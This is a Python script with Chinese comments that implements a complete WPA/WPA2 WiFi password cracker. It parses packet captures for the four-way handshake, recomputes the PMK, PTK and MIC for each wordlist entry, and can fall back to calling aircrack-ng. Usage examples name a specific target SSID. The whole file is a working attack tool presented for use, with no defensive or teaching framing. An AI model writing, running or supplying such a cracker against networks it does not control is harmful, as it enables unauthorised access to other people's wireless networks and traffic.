#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPA/WPA2 WiFi 密码破解脚本
支持两种模式：
  1. 调用 aircrack-ng（如果已安装）— 最可靠
  2. 纯 Python 字典攻击（解析 pcap，计算 PMK/PTK/MIC 验证）

用法：
  python crack_wifi.py <cap文件> <字典文件> [--ssid 2lou]

示例：
  python crack_wifi.py capture.cap rockyou.txt --ssid 2lou
  python crack_wifi.py capture.cap wordlist.txt
"""

import os
import sys
import hmac
import struct
import hashlib
import subprocess
import argparse
import binascii

# ─── PBKDF2 & PRF ────────────────────────────────────────────────────

def pbkdf2_hmac_sha1(password: bytes, salt: bytes, iterations: int, dklen: int) -> bytes:
    """PBKDF2-HMAC-SHA1 — 用于从密码 + SSID 推导 PMK"""
    return hashlib.pbkdf2_hmac("sha1", password, salt, iterations, dklen)


def prf_512(key: bytes, a: bytes, b: bytes) -> bytes:
    """
    WPA2 PRF-512 函数
    R = HMAC-SHA1(K, A || 0x00 || B || 0x00) ||
        HMAC-SHA1(K, A || 0x00 || B || 0x01) ||
        HMAC-SHA1(K, A || 0x00 || B || 0x02) ||
        HMAC-SHA1(K, A || 0x00 || B || 0x03)
    返回 64 字节 PTK
    """
    r = b""
    for i in range(4):
        data = a + b"\x00" + b + bytes([i])
        r += hmac.new(key, data, hashlib.sha1).digest()
    return r


def derive_ptk(pmk: bytes, ap_mac: bytes, sta_mac: bytes,
               anonce: bytes, snonce: bytes) -> bytes:
    """
    从 PMK 推导 PTK
    PTK = PRF-512(PMK, "Pairwise key expansion", minMAC || maxMAC || minNonce || maxNonce)
    """
    a = b"Pairwise key expansion"

    # MAC 和 Nonce 按字节比较取 min/max
    mac1, mac2 = (ap_mac, sta_mac) if ap_mac < sta_mac else (sta_mac, ap_mac)
    nonce1, nonce2 = (anonce, snonce) if anonce < snonce else (snonce, anonce)

    b = mac1 + mac2 + nonce1 + nonce2
    return prf_512(pmk, a, b)


def compute_mic(kck: bytes, eapol_frame: bytes) -> bytes:
    """
    计算 EAPOL 帧的 MIC
    KCK = PTK 的前 16 字节
    EAPOL 帧中的 MIC 字段必须置零
    返回 16 字节 HMAC-SHA1
    """
    return hmac.new(kck, eapol_frame, hashlib.sha1).digest()


# ─── pcap 解析 ────────────────────────────────────────────────────────

def parse_pcap(filepath: str):
    """
    解析 pcap / pcapng 文件，提取 WPA 四次握手信息
    返回: {
        'ssid': str,
        'ap_mac': bytes (6 bytes),
        'sta_mac': bytes (6 bytes),
        'anonce': bytes (32 bytes),
        'snonce': bytes (32 bytes),
        'eapol_mic': bytes (16 bytes),
        'eapol_frame_data': bytes (EAPOL 帧，MIC 部分置零),
        'message_num': int,
    }
    """
    with open(filepath, "rb") as f:
        data = f.read()

    # 判断文件类型
    if data[:4] == b"\xd4\xc3\xb2\xa1" or data[:4] == b"\xa1\xb2\xc3\xd4":
        return _parse_pcap(data)
    elif data[:4] == b"\x0a\x0d\x0d\x0a":
        return _parse_pcapng(data)
    else:
        raise ValueError(f"无法识别的文件格式，前4字节: {data[:4].hex()}")


def _parse_pcap(data: bytes):
    """解析传统 .pcap 格式"""
    magic = data[:4]
    if magic == b"\xd4\xc3\xb2\xa1":
        byte_order = "<"  # little-endian
    elif magic == b"\xa1\xb2\xc3\xd4":
        byte_order = ">"  # big-endian
    else:
        raise ValueError("无效的 pcap magic number")

    # 全局头 24 字节
    offset = 24

    beacons = []      # (ssid, ap_mac)
    eapol_packets = []

    while offset + 16 <= len(data):
        # 包头部 16 字节
        ts_sec, ts_usec, incl_len, orig_len = struct.unpack(
            f"{byte_order}IIII", data[offset:offset + 16]
        )
        offset += 16
        if offset + incl_len > len(data):
            break

        pkt_data = data[offset:offset + incl_len]
        offset += incl_len

        if len(pkt_data) < 14:
            continue

        eth_header = pkt_data[:14]
        eth_type = struct.unpack("!H", eth_header[12:14])[0]

        # 802.11 数据帧（通过 radiotap 或直接）
        if eth_type == 0x0800:  # IPv4 — 跳过
            continue

        # 解析 802.11 帧 — 检查是否有 radiotap header
        pos = 14
        if len(pkt_data) <= pos:
            continue

        # 尝试检测 radiotap header
        # Radiotap: version=0, pad=0, len=...
        rt_version = pkt_data[pos]
        rt_pad = pkt_data[pos + 1]
        rt_len = struct.unpack("<H", pkt_data[pos + 2:pos + 4])[0]

        if rt_version == 0 and rt_len > 0 and rt_len <= len(pkt_data) - pos:
            # 有 radiotap header
            dot11_start = pos + rt_len
        else:
            # 无 radiotap，假设是直接的 802.11 帧
            dot11_start = pos

        if dot11_start + 2 > len(pkt_data):
            continue

        # 802.11 Frame Control (2 bytes)
        frame_ctrl = struct.unpack("<H", pkt_data[dot11_start:dot11_start + 2])[0]
        fc_type = (frame_ctrl >> 2) & 0x03     # 帧类型
        fc_subtype = (frame_ctrl >> 4) & 0x0f  # 子类型

        # Management frame (type=0)
        if fc_type == 0 and fc_subtype == 8:
            # Beacon frame — 提取 SSID
            ssid, ap_mac = parse_beacon(pkt_data, dot11_start)
            if ssid:
                beacons.append((ssid, ap_mac))

        # Data frame (type=2)
        if fc_type == 2:
            # 检查是否是 802.1X 认证 (EAPOL)
            # LLC header: AA AA 03 00 00 00
            # EAPOL EtherType: 0x888E
            addrs = parse_dot11_addrs(pkt_data, dot11_start, frame_ctrl)
            if addrs is None:
                continue

            addr1, addr2, addr3 = addrs

            # 跳过 802.11 头
            dot11_hdr_len = 24
            if dot11_start + dot11_hdr_len + 8 > len(pkt_data):
                continue

            llc = pkt_data[dot11_start + dot11_hdr_len:dot11_start + dot11_hdr_len + 8]

            # LLC SNAP header: AA AA 03 00 00 00 + 2字节 EtherType
            if llc[:6] == b"\xaa\xaa\x03\x00\x00\x00":
                ethertype = struct.unpack("!H", llc[6:8])[0]
                if ethertype == 0x888E:  # EAPOL
                    eapol_data = pkt_data[dot11_start + dot11_hdr_len + 8:]
                    eapol_info = parse_eapol_key(eapol_data, addr2, addr1)
                    if eapol_info:
                        eapol_packets.append(eapol_info)

    return build_handshake_info(beacons, eapol_packets)


def _parse_pcapng(data: bytes):
    """解析 .pcapng 格式"""
    # pcapng: Section Header Block 开头
    # Block Type: 4 bytes
    # Block Total Length: 4 bytes
    # ... data ...
    # Block Total Length: 4 bytes (again)
    offset = 0
    beacons = []
    eapol_packets = []

    while offset + 8 <= len(data):
        block_type, block_len = struct.unpack("<II", data[offset:offset + 8])
        if block_len < 12 or offset + block_len > len(data):
            break

        block_data = data[offset + 8:offset + block_len - 4]

        # Enhanced Packet Block (type=6)
        if block_type == 6:
            if len(block_data) < 20:
                offset += block_len
                continue

            # Interface ID: 4 bytes
            # Timestamp High: 4 bytes
            # Timestamp Low: 4 bytes
            # Captured Len: 4 bytes
            # Original Len: 4 bytes
            iface_id = struct.unpack("<I", block_data[0:4])[0]
            cap_len = struct.unpack("<I", block_data[12:16])[0]

            pkt_data = block_data[20:20 + cap_len]
            if len(pkt_data) < 14:
                offset += block_len
                continue

            # 解析 radiotap + 802.11
            pos = 0
            rt_version = pkt_data[0] if len(pkt_data) > 0 else -1
            if rt_version == 0 and len(pkt_data) > 4:
                rt_len = struct.unpack("<H", pkt_data[2:4])[0]
                if 0 < rt_len <= len(pkt_data):
                    pos = rt_len

            if pos + 2 > len(pkt_data):
                offset += block_len
                continue

            frame_ctrl = struct.unpack("<H", pkt_data[pos:pos + 2])[0]
            fc_type = (frame_ctrl >> 2) & 0x03
            fc_subtype = (frame_ctrl >> 4) & 0x0f

            # Beacon
            if fc_type == 0 and fc_subtype == 8:
                ssid, ap_mac = parse_beacon(pkt_data, pos)
                if ssid:
                    beacons.append((ssid, ap_mac))

            # Data / EAPOL
            if fc_type == 2:
                addrs = parse_dot11_addrs(pkt_data, pos, frame_ctrl)
                if addrs is None:
                    offset += block_len
                    continue
                addr1, addr2, addr3 = addrs

                dot11_hdr_len = 24
                if pos + dot11_hdr_len + 8 > len(pkt_data):
                    offset += block_len
                    continue

                llc = pkt_data[pos + dot11_hdr_len:pos + dot11_hdr_len + 8]
                if llc[:6] == b"\xaa\xaa\x03\x00\x00\x00":
                    ethertype = struct.unpack("!H", llc[6:8])[0]
                    if ethertype == 0x888E:
                        eapol_data = pkt_data[pos + dot11_hdr_len + 8:]
                        eapol_info = parse_eapol_key(eapol_data, addr2, addr1)
                        if eapol_info:
                            eapol_packets.append(eapol_info)

        offset += block_len

    # 对齐到 4 字节
    return build_handshake_info(beacons, eapol_packets)


def parse_dot11_addrs(pkt_data, offset, frame_ctrl):
    """解析 802.11 帧中的 MAC 地址"""
    to_ds = (frame_ctrl >> 8) & 0x01
    from_ds = (frame_ctrl >> 9) & 0x01

    if offset + 24 > len(pkt_data):
        return None

    # 802.11 头: FrameControl(2) Duration(2) Addr1(6) Addr2(6) Addr3(6) Seq(2)
    addr1 = pkt_data[offset + 4:offset + 10]   # RA
    addr2 = pkt_data[offset + 10:offset + 16]  # TA
    addr3 = pkt_data[offset + 16:offset + 22]  # BSSID / DA / SA

    return addr1, addr2, addr3


def parse_beacon(pkt_data, offset):
    """从 Beacon 帧中提取 SSID 和 AP MAC"""
    if offset + 36 > len(pkt_data):
        return None, None

    # BSSID = Addr3 (offset+16), SA = Addr2 (offset+10)
    ap_mac = pkt_data[offset + 16:offset + 22]
    # 同时尝试从 Addr2 获取
    if ap_mac == b"\x00" * 6 or ap_mac == b"\xff" * 6:
        ap_mac = pkt_data[offset + 10:offset + 16]

    # 跳过 802.11 管理帧固定字段
    # FrameCtrl(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtrl(2) = 24
    # Timestamp(8) + BeaconInterval(2) + CapabilityInfo(2) = 12
    # = 36 bytes
    params_start = offset + 36

    pos = params_start
    ssid = None
    while pos + 2 <= len(pkt_data):
        tag_num = pkt_data[pos]
        tag_len = pkt_data[pos + 1]
        pos += 2
        if tag_num == 0:  # SSID
            ssid = pkt_data[pos:pos + tag_len].decode("utf-8", errors="replace")
            break
        pos += tag_len

    return ssid, ap_mac


def parse_eapol_key(eapol_data, src_mac, dst_mac):
    """解析 EAPOL-Key 帧，提取握手信息"""
    if len(eapol_data) < 4:
        return None

    # EAPOL Header: Version(1) Type(1) Length(2)
    version = eapol_data[0]
    eapol_type = eapol_data[1]
    body_len = struct.unpack("!H", eapol_data[2:4])[0]

    if eapol_type != 3:  # EAPOL-Key
        return None

    key_data = eapol_data[4:4 + body_len]
    if len(key_data) < 95:
        return None

    # EAPOL-Key 字段
    key_desc_type = key_data[0]
    key_info = struct.unpack("!H", key_data[1:3])[0]

    key_type = (key_info >> 3) & 0x01          # 0=Group, 1=Pairwise
    key_ack = (key_info >> 7) & 0x01
    key_mic = (key_info >> 8) & 0x01
    install = (key_info >> 6) & 0x01
    secure = (key_info >> 9) & 0x01
    key_data_flag = (key_info >> 13) & 0x01

    if key_type != 1:  # 只处理 Pairwise Key
        return None

    if key_desc_type != 2:  # WPA2 uses descriptor type 2 (AES)
        # WPA uses descriptor type 254
        if key_desc_type != 254:
            return None

    key_length = struct.unpack("!H", key_data[3:5])[0]
    replay_counter = key_data[5:13]
    key_nonce = key_data[13:45]     # 32 bytes
    key_iv = key_data[45:61]
    key_rsc = key_data[61:69]
    key_id = key_data[69:77]
    key_mic_data = key_data[77:93]  # 16 bytes
    key_data_len = struct.unpack("!H", key_data[93:95])[0]

    # 确定消息编号
    # Msg1: ACK=1, MIC=0
    # Msg2: ACK=0, MIC=1
    # Msg3: ACK=1, MIC=1, INSTALL=1
    # Msg4: ACK=0, MIC=1
    if key_ack and not key_mic:
        msg_num = 1
    elif not key_ack and key_mic and not install:
        msg_num = 2
    elif key_ack and key_mic and install:
        msg_num = 3
    elif not key_ack and key_mic:
        # Could be msg 2 or 4 — need to check nonce
        if all(b == 0 for b in key_nonce):
            msg_num = 4
        else:
            msg_num = 2
    else:
        msg_num = 0  # unknown

    return {
        "msg_num": msg_num,
        "nonce": key_nonce,
        "mic": key_mic_data,
        "key_data_len": key_data_len,
        "eapol_frame": eapol_data,
        "src_mac": src_mac,
        "dst_mac": dst_mac,
    }


def build_handshake_info(beacons, eapol_packets):
    """从 beacon 和 EAPOL 帧组装握手信息"""
    # 按消息编号排序
    msgs = {p["msg_num"]: p for p in eapol_packets}

    if 1 not in msgs or (2 not in msgs and 3 not in msgs):
        # 至少需要 Msg1 和 Msg2
        if not eapol_packets:
            raise ValueError(
                "未找到任何 EAPOL 握手帧。请确认:\n"
                "  1. 抓包文件中包含 WPA 四次握手\n"
                "  2. 抓包时在目标客户端重连时进行的抓取"
            )
        # 尽量用已有的
        pass

    msg1 = msgs.get(1)
    msg2 = msgs.get(2)
    msg3 = msgs.get(3)

    if msg1 is None:
        raise ValueError("未找到 EAPOL Msg1 (ANonce)")

    # 确定 AP 和 Client MAC
    ap_mac = msg1.get("src_mac")
    sta_mac = msg1.get("dst_mac")

    if msg2:
        sta_mac = msg2["src_mac"]
        ap_mac = msg2["dst_mac"]

    # 从 beacon 中匹配 SSID
    ssid = None
    for b_ssid, b_mac in beacons:
        if b_mac == ap_mac or b_mac == sta_mac:
            ssid = b_ssid
            break

    if ssid is None and beacons:
        ssid = beacons[0][0]

    # 确定 ANonce (来自 AP, Msg1)
    anonce = msg1["nonce"]

    # SNonce (来自 Client, Msg2)
    snonce = None
    if msg2:
        snonce = msg2["nonce"]

    # 提取 MIC (从 Msg2 或 Msg3)
    verify_msg = msg2 if msg2 else msg3
    mic = verify_msg["mic"] if verify_msg else None

    # 构建用于 MIC 校验的 EAPOL 帧（MIC 置零）
    verify_frame = None
    if verify_msg:
        eapol_frame = verify_msg["eapol_frame"]
        # 完整 EAPOL 帧: header(4) + key_data
        # MIC 在 key_data[77:93]
        key_data = eapol_frame[4:]
        if len(key_data) >= 93:
            new_key_data = key_data[:77] + b"\x00" * 16 + key_data[93:]
            verify_frame = eapol_frame[:4] + new_key_data

    result = {
        "ssid": ssid,
        "ap_mac": ap_mac,
        "sta_mac": sta_mac,
        "anonce": anonce,
        "snonce": snonce,
        "mic": mic,
        "verify_frame": verify_frame,
        "msgs": msgs,
    }

    return result


# ─── 字典破解 ─────────────────────────────────────────────────────────

def crack_wpa(handshake: dict, wordlist_path: str, target_ssid: str = None):
    """
    使用字典文件尝试破解 WPA 密码
    """
    ssid = target_ssid or handshake.get("ssid")
    if not ssid:
        print("[!] 错误: 无法确定 SSID。请使用 --ssid 参数指定")
        sys.exit(1)

    ap_mac = handshake["ap_mac"]
    sta_mac = handshake["sta_mac"]
    anonce = handshake["anonce"]
    snonce = handshake.get("snonce")
    expected_mic = handshake["mic"]
    verify_frame = handshake["verify_frame"]

    # 验证必要数据
    if not anonce or len(anonce) != 32:
        print("[!] 错误: 未找到有效的 ANonce")
        sys.exit(1)

    if not snonce or len(snonce) != 32:
        print("[!] 错误: 未找到有效的 SNonce（需要 EAPOL Msg2）")
        sys.exit(1)

    if not expected_mic or len(expected_mic) != 16:
        print("[!] 错误: 未找到有效的 MIC")
        sys.exit(1)

    if not verify_frame:
        print("[!] 错误: 无法构建校验帧")
        sys.exit(1)

    print(f"\n{'='*60}")
    print(f"  WPA/WPA2 字典攻击")
    print(f"{'='*60}")
    print(f"  SSID      : {ssid}")
    print(f"  AP MAC    : {ap_mac.hex(':')}")
    print(f"  STA MAC   : {sta_mac.hex(':')}")
    print(f"  ANonce    : {anonce.hex()[:32]}...")
    print(f"  SNonce    : {snonce.hex()[:32]}...")
    print(f"  字典文件  : {wordlist_path}")
    print(f"{'='*60}\n")

    if not os.path.isfile(wordlist_path):
        print(f"[!] 字典文件不存在: {wordlist_path}")
        sys.exit(1)

    ssid_bytes = ssid.encode("utf-8")
    total = 0
    tested = 0

    # 先统计总数（可选大文件较慢）
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for _ in f:
                total += 1
    except Exception:
        total = 0

    print(f"[*] 字典共 {total} 个密码\n")
    if total == 0:
        print("[!] 字典文件为空")
        sys.exit(1)

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue

            tested += 1

            # 进度显示
            if tested % 10000 == 0 or tested == total:
                pct = (tested / total * 100) if total > 0 else 0
                print(f"\r[*] 进度: {tested}/{total} ({pct:.1f}%)  当前尝试: {password[:30]}",
                      end="", flush=True)

            # PMK = PBKDF2(Password, SSID, 4096, 256)
            pmk = pbkdf2_hmac_sha1(
                password.encode("utf-8"),
                ssid_bytes,
                4096,
                32
            )

            # PTK = PRF-512(PMK, "Pairwise key expansion", ...)
            ptk = derive_ptk(pmk, ap_mac, sta_mac, anonce, snonce)

            # KCK = PTK[0:16]
            kck = ptk[:16]

            # MIC = HMAC-SHA1(KCK, EAPOL帧)
            computed_mic = compute_mic(kck, verify_frame)

            if computed_mic == expected_mic:
                print(f"\n\n{'='*60}")
                print(f"  🎉 密码已找到！")
                print(f"  SSID     : {ssid}")
                print(f"  Password : {password}")
                print(f"{'='*60}\n")
                return password

    print(f"\n\n[*] 字典攻击完成，共测试 {tested} 个密码")
    print("[!] 未找到匹配的密码。建议尝试更大的字典或不同的字典。")
    return None


# ─── aircrack-ng 模式 ─────────────────────────────────────────────────

def crack_with_aircrack(cap_file: str, wordlist_path: str, ssid: str = None):
    """使用 aircrack-ng 破解"""
    print(f"\n[*] 调用 aircrack-ng 进行破解...\n")

    cmd = ["aircrack-ng", "-w", wordlist_path, cap_file]
    if ssid:
        cmd.extend(["-e", ssid])

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=3600  # 1小时超时
        )
        print(result.stdout)
        if result.stderr:
            print("[stderr]:", result.stderr)

        # 检查是否找到密码
        for line in result.stdout.split("\n"):
            if "KEY FOUND" in line:
                # 提取密码
                parts = line.split("KEY FOUND!")
                if len(parts) > 1:
                    password = parts[1].strip().strip("[]").strip("'")
                    print(f"\n🎉 密码: {password}")
                    return password
        return None
    except FileNotFoundError:
        print("[!] aircrack-ng 未安装。请安装 aircrack-ng 或使用纯 Python 模式。")
        print("    Windows: 下载 https://www.aircrack-ng.org/")
        print("    或用包管理器: choco install aircrack-ng")
        return None
    except subprocess.TimeoutExpired:
        print("[!] aircrack-ng 超时（超过1小时）")
        return None


# ─── 主入口 ───────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="WPA/WPA2 WiFi 密码破解工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python crack_wifi.py capture.cap rockyou.txt
  python crack_wifi.py capture.cap wordlist.txt --ssid 2lou
  python crack_wifi.py capture.cap wordlist.txt --aircrack
        """
    )
    parser.add_argument("capfile", help="抓包文件 (.cap / .pcap / .pcapng)")
    parser.add_argument("wordlist", help="密码字典文件 (每行一个密码)")
    parser.add_argument("--ssid", "-s", default=None, help="目标 WiFi SSID (默认自动检测)")
    parser.add_argument("--aircrack", "-a", action="store_true",
                        help="使用 aircrack-ng 而不是纯 Python")
    args = parser.parse_args()

    if not os.path.isfile(args.capfile):
        print(f"[!] 文件不存在: {args.capfile}")
        print(f"[!] 请将抓包文件放入: {os.path.dirname(os.path.abspath(args.capfile)) or os.getcwd()}")
        sys.exit(1)

    print(f"[*] 抓包文件: {args.capfile}")
    print(f"[*] 字典文件: {args.wordlist}")

    if args.aircrack:
        crack_with_aircrack(args.capfile, args.wordlist, args.ssid)
        return

    # 纯 Python 模式
    print("[*] 解析抓包文件...")
    try:
        handshake = parse_pcap(args.capfile)
    except ValueError as e:
        print(f"[!] 解析失败: {e}")
        print("[*] 尝试使用 aircrack-ng 模式: python crack_wifi.py ... --aircrack")
        sys.exit(1)

    if handshake["ssid"]:
        print(f"[*] 检测到 SSID: {handshake['ssid']}")
    else:
        print("[*] 未从 Beacon 中检测到 SSID")

    if args.ssid:
        print(f"[*] 使用指定 SSID: {args.ssid}")

    # 显示检测到的消息
    msgs = handshake.get("msgs", {})
    print(f"[*] 检测到 EAPOL 消息: M{', M'.join(str(k) for k in sorted(msgs.keys()))}")

    if 2 not in msgs and 3 not in msgs:
        print("[!] 警告: 需要 Msg2 或 Msg3 来进行 MIC 校验")
        if args.aircrack:
            pass
        else:
            print("[!] 纯 Python 模式需要完整的四次握手")
            sys.exit(1)

    crack_wpa(handshake, args.wordlist, args.ssid)


if __name__ == "__main__":
    main()